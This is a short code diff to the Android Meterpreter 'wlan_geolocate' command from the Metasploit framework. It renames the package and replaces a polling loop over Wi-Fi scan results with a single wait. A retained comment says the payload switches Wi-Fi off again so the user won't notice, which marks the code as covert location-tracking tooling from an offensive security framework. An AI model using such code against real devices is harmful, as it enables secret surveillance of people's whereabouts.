@@ -1,4 +1,4 @@
- package com.metasploit.meterpreter;
+ package com.metasploit.meterpreter.android;
 
 import java.util.List;
 
@@ -74,19 +74,7 @@ public class wlan_geolocate implements Command {
 
 	 wifiList=null;
 	 synchronized (scanready){
-		int n=0;
-		while(wifiList == null) {
-//			Log.i("AAA","Waiting for scan results..");
-
-			//Unsure what happens if there are is no WiFi around,
-			//so this returns an error after 30sec without scan results
-			if (n>30){
-				return ERROR_FAILURE;
-			}
-		       	scanready.wait(1000);
-			n++;
-	 	}
-
+	       	scanready.wait(30000);
 		//If wifi was disabled when process started, turn it off again
 		//hopefully fast-enough that user won't notice =)
 		if (WifiStatus == false){
